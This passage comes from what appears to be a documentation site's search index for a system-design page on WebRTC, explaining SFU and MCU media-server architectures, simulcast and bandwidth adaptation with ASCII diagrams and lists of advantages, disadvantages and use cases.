(active) + 10\u00d7200Kbps (thumbnails)\n  = 4 Mbps total \u2713\n\n\u2705 Scales to 100+ participants!\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#how-it-works_1","title":"How It Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                SFU Processing Flow                           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPARTICIPANT                 SFU                    PARTICIPANTS\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                \u2500\u2500\u2500\u2500\u2500                   \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nAlice sends stream:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Camera    \u2502\n\u2502    \u2193       \u2502\n\u2502  Encode    \u2502 1080p\n\u2502  (H.264)   \u2502 2 Mbps\n\u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n      \u2502\n      \u2502 Upload 1 stream\n      \u25bc\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551           SFU                 \u2551\n    \u2551                               \u2551\n    \u2551  1. RECEIVE stream from Alice \u2551\n    \u2551     (encrypted)               \u2551\n    \u2551         \u2193                     \u2551\n    \u2551  2. FORWARD without changes   \u2551\n    \u2551     (no decoding/encoding)    \u2551\n    \u2551         \u2193                     \u2551\n    \u2551  3. ROUTE to recipients       \u2551\n    \u2551     \u2022 Bob                     \u2551\n    \u2551     \u2022 Charlie                 \u2551\n    \u2551     \u2022 David                   \u2551\n    \u2551                               \u2551\n    \u2551  \u26a1 Low CPU (no transcoding)  \u2551\n    \u2551  \u26a1 Low latency (&lt;50ms)       \u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n            \u2502       \u2502       \u2502\n            \u2502       \u2502       \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2510  \u250c\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510  \u250c\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502  Bob   \u2502  \u2502Charlie\u2502  \u2502 David \u2502\n    \u2502        \u2502  \u2502       \u2502  \u2502       \u2502\n    \u2502 Decode \u2502  \u2502Decode \u2502  \u2502Decode \u2502\n    \u2502Display \u2502  \u2502Display\u2502  \u2502Display\u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSIMULCAST (Multi-quality streaming):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nAlice's browser encodes SAME video at 3 qualities:\n\nCamera Feed\n    \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Encoder 1: 1080p    \u2502 2 Mbps (high)\n\u2502  Encoder 2: 720p     \u2502 1 Mbps (medium)\n\u2502  Encoder 3: 360p     \u2502 300 Kbps (low)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502 All 3 sent to SFU\n           \u25bc\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551           SFU                 \u2551\n    \u2551                               \u2551\n    \u2551  Smart Routing:               \u2551\n    \u2551                               \u2551\n    \u2551  Bob (good connection):       \u2551\n    \u2551    \u2192 Send 1080p               \u2551\n    \u2551                               \u2551\n    \u2551  Charlie (medium):            \u2551\n    \u2551    \u2192 Send 720p                \u2551\n    \u2551                               \u2551\n    \u2551  David (poor/mobile):         \u2551\n    \u2551    \u2192 Send 360p                \u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nBANDWIDTH ADAPTATION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nSFU monitors each recipient's connection:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Bob's Connection                   \u2502\n\u2502 \u251c\u2500 Bandwidth: 10 Mbps \u2713           \u2502\n\u2502 \u251c\u2500 Packet loss: 0.1% \u2713            \u2502\n\u2502 \u2514\u2500 Latency: 30ms \u2713                \u2502\n\u2502                                    \u2502\n\u2502 Decision: Send HD quality          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 David's Connection                 \u2502\n\u2502 \u251c\u2500 Bandwidth: 1 Mbps \u26a0\ufe0f            \u2502\n\u2502 \u251c\u2500 Packet loss: 5% \u26a0\ufe0f              \u2502\n\u2502 \u2514\u2500 Latency: 150ms \u26a0\ufe0f               \u2502\n\u2502                                    \u2502\n\u2502 Decision: Send Low quality         \u2502\n\u2502 (Better to have choppy low-res     \u2502\n\u2502  than frozen high-res)             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#advantages_1","title":"Advantages","text":"<pre><code>\u2705 BENEFITS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. EXCELLENT SCALABILITY\n   \u2022 Handles 100+ participants\n   \u2022 Linear bandwidth growth for clients\n   \u2022 Each user: 1 upload, N downloads\n   \u2022 No exponential connection growth\n\n2. EFFICIENT BANDWIDTH\n   \u2022 Clients upload only 1 stream\n   \u2022 10-person call: 2 Mbps upload (vs 18 Mbps in P2P)\n   \u2022 Works on typical home internet\n   \u2022 Mobile-friendly\n\n3. LOW CLIENT CPU\n   \u2022 Encode once, SFU distributes\n   \u2022 No need to encode multiple times\n   \u2022 Better battery life\n   \u2022 Works on low-end devices\n\n4. ADAPTIVE QUALITY (Simulcast)\n   \u2022 Send different quality to each user\n   \u2022 High quality for good connections\n   \u2022 Low quality for poor connections\n   \u2022 Each user gets best possible experience\n\n5. FAST &amp; LOW LATENCY\n   \u2022 No transcoding (forwarding only)\n   \u2022 Typical latency: 50-150ms\n   \u2022 Near real-time communication\n   \u2022 Much faster than MCU\n\n6. EASY TO SCALE HORIZONTALLY\n   \u2022 Add more SFU servers\n   \u2022 Load balance across servers\n   \u2022 Geographic distribution (CDN-like)\n\n7. COST EFFECTIVE\n   \u2022 Lower server costs than MCU\n   \u2022 No heavy CPU for transcoding\n   \u2022 Can use cheaper servers\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#disadvantages_1","title":"Disadvantages","text":"<pre><code>\u274c LIMITATIONS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. SERVER INFRASTRUCTURE REQUIRED\n   \u2022 Need to host SFU servers\n   \u2022 Operational costs\n   \u2022 Maintenance overhead\n   \u2022 Not free like P2P\n\n2. HIGH CLIENT DOWNLOAD BANDWIDTH\n   \u2022 Still receives N-1 streams\n   \u2022 100-person call: Download 100+ streams\n   \u2022 Can overwhelm client connection\n   \u2022 Mitigated with simulcast + active speaker\n\n3. HIGH SERVER BANDWIDTH\n   \u2022 Must receive all streams\n   \u2022 Must send all streams to all participants\n   \u2022 100 users = receive 100, send 9,900 streams\n   \u2022 Expensive bandwidth costs at scale\n\n4. CLIENT MUST DECODE MULTIPLE STREAMS\n   \u2022 CPU to decode 9-100 video streams\n   \u2022 Memory usage\n   \u2022 Can struggle on low-end devices\n   \u2022 Mitigated with active speaker layouts\n\n5. NO BUILT-IN RECORDING\n   \u2022 SFU doesn't decode streams\n   \u2022 Recording requires separate component\n   \u2022 Must record all individual streams\n   \u2022 Post-processing needed for single output\n\n6. NETWORK QUALITY VARIES PER USER\n   \u2022 Each user sees different quality\n   \u2022 Depends on their connection\n   \u2022 Inconsistent experience\n   \u2022 Some see HD, others see potato quality\n\n7. REQUIRES SIMULCAST SUPPORT\n   \u2022 Not all browsers support it well\n   \u2022 Adds complexity to client\n   \u2022 Triples encoding bandwidth (3 qualities)\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#use-cases_1","title":"Use Cases","text":"<pre><code>\u2705 IDEAL FOR:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Group video calls (4-100 people)\n\u2022 Virtual meetings (Zoom, Google Meet, Microsoft Teams)\n\u2022 Online education (moderate class sizes)\n\u2022 Telemedicine\n\u2022 Remote interviews\n\u2022 Gaming streams with viewers\n\u2022 Social video apps\n\n\u2705 BEST FOR:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Interactive video conferences\n\u2022 When low latency is critical (&lt;200ms)\n\u2022 When participants need to see each other\n\u2022 When quality can vary per user\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#3-mcu-multipoint-control-unit","title":"3. MCU (Multipoint Control Unit)","text":""},{"location":"system-design/high-level/concepts/webrtc/#description_2","title":"Description","text":"<p>An MCU is a media server that receives all participant streams, decodes them, mixes/composes them into a single unified stream, and re-encodes it before sending to each participant. Each participant receives one combined video layout.</p> <p>Key Concept: The MCU does heavy processing - decode, mix, encode.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         MCU (Multipoint Control Unit) Architecture           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n4 PARTICIPANTS WITH MCU:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Alice \u2502  \u2502 Bob  \u2502  \u2502Charli\u2502  \u2502David \u2502\n\u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2518  \u2514\u2500\u2500\u252c\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u252c\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u252c\u2500\u2500\u2500\u2518\n    \u2502        \u2502         \u2502         \u2502\n    \u2502 1080p  \u2502 1080p   \u2502 1080p   \u2502 1080p\n    \u2502 2 Mbps \u2502 2 Mbps  \u2502 2 Mbps  \u2502 2 Mbps\n    \u2502        \u2502         \u2502         \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u25bc\n         \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n         \u2551        MCU         \u2551\n         \u2551                    \u2551\n         \u2551  1. RECEIVE all    \u2551\n         \u2551  2. DECODE all     \u2551\n         \u2551  3. COMPOSE layout \u2551\n         \u2551     \u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2510  \u2551\n         \u2551     \u2502 A   \u2502 B   \u2502  \u2551\n         \u2551     \u251c\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524  \u2551\n         \u2551     \u2502 C   \u2502 D   \u2502  \u2551\n         \u2551     \u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518  \u2551\n         \u2551  4. ENCODE once    \u2551\n         \u2551  5. SEND to all    \u2551\n         \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n                    \u2502\n                    \u2502 Same stream to everyone\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502          \u2502          \u2502\n    \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2510\n    \u2502Alice  \u2502  \u2502 Bob   \u2502  \u2502Charlie\u2502  \u2502 David \u2502\n    \u2502       \u2502  \u2502       \u2502  \u2502       \u2502  \u2502       \u2502\n    \u2502 Grid  \u2502  \u2502 Grid  \u2502  \u2502 Grid  \u2502  \u2502 Grid  \u2502\n    \u2502Layout \u2502  \u2502Layout \u2502  \u2502Layout \u2502  \u2502Layout \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nEach User:\n\u2022 Upload: 1 stream (2 Mbps)\n\u2022 Download: 1 stream (2 Mbps) \u2713\u2713\u2713 Very efficient!\n\u2022 Total: 4 Mbps (vs 8 Mbps in SFU, 36 Mbps in P2P)\n\n\n10 PARTICIPANTS WITH MCU:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n10 users send individual streams\n           \u2193\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551           MCU             \u2551\n    \u2551                           \u2551\n    \u2551  DECODE: 10 streams       \u2551\n    \u2551      \u2193                    \u2551\n    \u2551  COMPOSE: Grid layout     \u2551\n    \u2551  \u250c\u2500\u2500\u252c\u2500\u2500\u252c\u2500\u2500\u252c\u2500\u2500\u252c\u2500\u2500\u2510         \u2551\n    \u2551  \u2502U1\u2502U2\u2502U3\u2502U4\u2502U5\u2502         \u2551\n    \u2551  \u251c\u2500\u2500\u253c\u2500\u2500\u253c\u2500\u2500\u253c\u2500\u2500\u253c\u2500\u2500\u2524         \u2551\n    \u2551  \u2502U6\u2502U7\u2502U8\u2502U9\u250210\u2502         \u2551\n    \u2551  \u2514\u2500\u2500\u2534\u2500\u2500\u2534\u2500\u2500\u2534\u2500\u2500\u2534\u2500\u2500\u2518         \u2551\n    \u2551      \u2193                    \u2551\n    \u2551  ENCODE: 1 composed video \u2551\n    \u2551                           \u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n                \u2502\n      Same composite to all 10 users\n\nPer User Bandwidth:\n\u2022 Upload: 2 Mbps\n\u2022 Download: 2 Mbps\n\u2022 Total: 4 Mbps \u2713\n\nMCU Server:\n\u2022 CPU: VERY HIGH (decode 10, encode 1)\n\u2022 Bandwidth: Moderate (receive 10, send 10)\n\n\n100 PARTICIPANTS WITH MCU:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nMCU creates different layouts for different roles:\n\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551           MCU             \u2551\n    \u2551                           \u2551\n    \u2551  Presenter View:          \u2551\n    \u2551  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2551\n    \u2551  \u2502   Active Speaker    \u2502  \u2551\n    \u2551  \u2502      (Large)        \u2502  \u2551\n    \u2551  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2551\n    \u2551                           \u2551\n    \u2551  Attendee View:           \u2551\n    \u2551  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510               \u2551\n    \u2551  \u2502Speaker \u2502               \u2551\n    \u2551  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518               \u2551\n    \u2551  (Small, presenter only)  \u2551\n    \u2551                           \u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nPer User Bandwidth:\n\u2022 Upload: 2 Mbps (or muted for attendees)\n\u2022 Download: 2 Mbps (single composite)\n\u2022 Total: 2-4 Mbps \u2713\u2713\u2713\n\n\u2705 Extremely efficient for client!\n\u274c Extremely expensive for server!\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#how-it-works_2","title":"How It Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              MCU Processing Pipeline                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 1: RECEIVE\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nAlice    Bob    Charlie   David\n  \u2502       \u2502        \u2502        \u2502\n  \u2502 H.264 \u2502 H.264  \u2502 H.264  \u2502 VP8\n  \u2502 1080p \u2502 720p   \u2502 1080p  \u2502 720p\n  \u2502       \u2502        \u2502        \u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2193\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551  MCU - Receive    \u2551\n    \u2551  4 different      \u2551\n    \u2551  streams          \u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nSTEP 2: DECODE\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551  MCU - Decode     \u2551\n    \u2551                   \u2551\n    \u2551  Decoder 1: H.264 \u2192 Raw video frames\n    \u2551  Decoder 2: H.264 \u2192 Raw video frames\n    \u2551  Decoder 3: H.264 \u2192 Raw video frames\n    \u2551  Decoder 4: VP8   \u2192 Raw video frames\n    \u2551                   \u2551\n    \u2551  Output: Raw RGB/YUV frames\n    \u2551                   \u2551\n    \u2551  \ud83d\udd25 CPU INTENSIVE!\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nSTEP 3: COMPOSE/MIX\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551  MCU - Video Compositor           \u2551\n    \u2551                                   \u2551\n    \u2551  Create layout:                   \u2551\n    \u2551                                   \u2551\n    \u2551  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2551\n    \u2551  \u2502  Canvas: 1920 \u00d7 1080        \u2502  \u2551\n    \u2551  \u2502                             \u2502  \u2551\n    \u2551  \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502  \u2551\n    \u2551  \u2502  \u2502Alice \u2502 Bob  \u2502            \u2502  \u2551\n    \u2551  \u2502  \u2502960\u00d7540\u2502960\u00d7540           \u2502  \u2551\n    \u2551  \u2502  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2524            \u2502  \u2551\n    \u2551  \u2502  \u2502Charl.\u2502David \u2502            \u2502  \u2551\n    \u2551  \u2502  \u2502960\u00d7540\u2502960\u00d7540           \u2502  \u2551\n    \u2551  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502  \u2551\n    \u2551  \u2502                             \u2502  \u2551\n    \u2551  \u2502  + Overlay graphics         \u2502  \u2551\n    \u2551  \u2502  + Names, logos             \u2502  \u2551\n    \u2551  \u2502  + Highlight active speaker \u2502  \u2551\n    \u2551  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2551\n    \u2551                                   \u2551\n    \u2551  \ud83d\udd25 CPU &amp; MEMORY INTENSIVE!       \u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n    Audio Mixing:\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502  Mix all audio streams:         \u2502\n    \u2502  Alice audio + Bob audio +      \u2502\n    \u2502  Charlie audio + David audio    \u2502\n    \u2502  = Single mixed audio track     \u2502\n    \u2502                                 \u2502\n    \u2502  \u2022 Remove echo                  \u2502\n    \u2502  \u2022 Normalize volume             \u2502\n    \u2502  \u2022 Suppress background noise    \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 4: ENCODE\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551  MCU - Encoder                    \u2551\n    \u2551                                   \u2551\n    \u2551  Composite video + Mixed audio    \u2551\n    \u2551         \u2193                         \u2551\n    \u2551  Encode to H.264/VP8              \u2551\n    \u2551  1080p @ 2 Mbps                   \u2551\n    \u2551         \u2193                         \u2551\n    \u2551  Single output stream             \u2551\n    \u2551                                   \u2551\n    \u2551  \ud83d\udd25 CPU INTENSIVE!                \u2551\n    